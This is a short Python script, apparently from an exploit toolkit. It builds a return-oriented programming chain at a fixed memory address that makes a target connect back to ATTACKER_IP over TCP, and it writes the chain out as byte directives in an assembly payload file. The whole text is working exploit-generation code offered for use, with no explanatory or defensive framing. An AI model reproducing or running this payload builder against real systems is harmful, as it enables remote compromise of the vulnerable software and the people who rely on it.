from tcp_ropchain import *
from config import *
import struct

rop_chain = tcp_thread_ropchain(0x4D070000 + 0x14, ATTACKER_IP, TCP_SERVER_PORT)

with open('payload.s', 'w') as f:
    for val in rop_chain:
        bytes = [hex(val >> i & 0xff) for i in (24,16,8,0)]
        for v in bytes:
            print('byte %s' % v, file=f)